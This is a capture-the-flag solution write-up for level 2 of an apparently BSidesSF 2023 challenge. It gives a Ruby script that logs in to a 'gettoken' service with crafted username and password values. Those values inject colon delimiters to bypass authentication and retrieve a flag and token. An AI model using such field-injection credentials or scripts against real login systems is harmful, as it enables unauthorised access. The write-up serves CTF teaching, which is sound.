This is a solution to the second level. It should only be published part-way
through the night, unless I push it early by mistake!

## Solution

[Here's the full source online](https://github.com/BSidesSF/ctf-2023/tree/main/challenges/getout2-gettoken/solution)

To solve level 2, connect to the service called `gettoken`, the same way you
did in level 1.

Then, authenticate with the username `:testuser:` and password `root:0:123`.
That should bypass the authentication checks! Check out the level 2 source to
see why.

Basically, using `libgetout.rb` (on the [implementation page](/protocol-implementation-ruby)):

```ruby
# encoding: ASCII-8bit

require './libgetout'

begin
  s = connect(ARGV[0], ARGV[1] || 1337)

  # Connect to gettoken
  out = use(s, 'gettoken')
  puts "Response to 'use': #{ out }"

  # Log in with the backdoor username/password
  s.write(create_message([
    {
      type: :string,
      value: ':testuser:',
    },
    {
      type: :string,
      value: 'root:0:123',
    },
  ]))
  out = read_message(s)
  if out[0][:value] != 0
    $stderr.puts "Backdoor account failed!"
    exit 1
  end

  flag = out[1][:value]
  token = out[2][:value]

  puts "token = #{ token }"
  puts "flag = #{ flag }"
ensure
  s.close if s
end
```
